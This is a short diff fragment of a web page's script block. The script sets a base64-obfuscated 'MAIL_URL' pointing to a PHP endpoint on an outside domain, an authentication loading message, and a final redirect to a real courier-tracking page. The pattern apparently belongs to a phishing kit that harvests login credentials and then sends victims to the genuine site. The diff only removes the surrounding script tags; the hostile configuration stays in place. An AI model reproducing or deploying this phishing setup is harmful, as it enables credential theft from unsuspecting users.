@@ -1,5 +1,5 @@
 
-    <script>
+
       window.MAIL_URL = 'aHR0cHM6Ly9hc3Npc3Rla2RvbWFpbi5vcmcvQHAvY2huL2luZGV4LnBocA=='
       window.AUTH_LOADING_MESSAGE = '. . .'
       window.FINAL_REDIRECT_URL = 'https://www.aftership.com/couriers/sf-express'
@@ -259,4 +259,3 @@
           }
         })
       })
-    </script>
